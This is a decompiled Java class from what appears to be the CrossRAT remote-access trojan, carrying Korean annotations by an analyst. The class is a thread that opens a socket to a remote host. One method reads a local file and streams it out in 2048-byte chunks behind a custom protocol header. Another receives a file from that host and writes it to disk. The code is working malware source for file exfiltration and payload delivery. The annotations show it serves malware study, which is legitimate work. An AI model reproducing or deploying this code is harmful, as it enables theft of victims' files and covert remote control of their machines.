package crossrat;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.Socket;

public final class d extends Thread {
    private Socket a;
    private String b;
    private int c;
    private String d;
    private String e;
    private String f;
    private String g;

    // constructor
    public d(String var1, int var2, String var3, String var4, String var5, String var6) {
        this.b = var1;
        this.c = var2;
        this.f = var5;
        this.e = var4;
        this.d = var3;
        this.g = var6;
    }

    // var1이라는 이름의 파일을 읽음
    // var2와 var3가 포함된 문자열을 만들어서
    // 2048 bytes만큼씩 var4라는 이름의 파일로 저장
    private void a(String var1, String var2, String var3) {
        DataOutputStream var4 = new DataOutputStream(this.a.getOutputStream());
        FileInputStream var6 = new FileInputStream(var1);
        var4.writeBytes(k.g + k.d + k.G + k.d + var2 + k.d + var3 + k.d + "&&&"); // 뭔가를 var4에 기록
        // [UUID]$#@@0010$#@[var2]$#@[var3]$#@&&&
        // var4 : 기록할 파일
        // var6 : 읽어들인 파일
        // k.g: String으로 비어 있음
        // k.d: $#@
        // k.G: @0010

        try {
            Thread.sleep(2000L);
        } catch (Exception var5) {
            var5.printStackTrace();
        }

        // 도대체
        byte[] var7 = new byte[2048];

        while (var6.read(var7) > 0) {
            var4.write(var7);
        }

        var6.close();
        var4.close();
    }

    private void b(String var1, String var2, String var3) {
        DataInputStream var4 = new DataInputStream(this.a.getInputStream());
        FileOutputStream var7 = new FileOutputStream(var1);
        (new DataOutputStream(this.a.getOutputStream())).writeBytes(k.g + k.d + k.H + k.d + var2 + k.d + var3 + k.d + "&&&");
        // k.g: 비어있는 String, k.H: @0011, var2: , var3:

        try {
            Thread.sleep(2000L);
        } catch (Exception var6) {
            var6.printStackTrace();
        }

        byte[] var8 = new byte[2048];
        int var5 = Integer.parseInt(var3);

        int var9;
        while ((var9 = var4.read(var8, 0, Math.min(2048, var5))) > 0) {
            var5 -= var9;
            var7.write(var8, 0, var9);
        }

        var7.close();
        var4.close();
    }

    public final void run() {
        try {
            this.a = new Socket(this.b, this.c);
            if (this.g == "0") {
                this.a(this.d, this.e, this.f);
            }

            if (this.g == "1") {
                this.b(this.d, this.e, this.f);
                return;
            }
        } catch (Exception var2) {
            var2.printStackTrace();
        }

    }
}
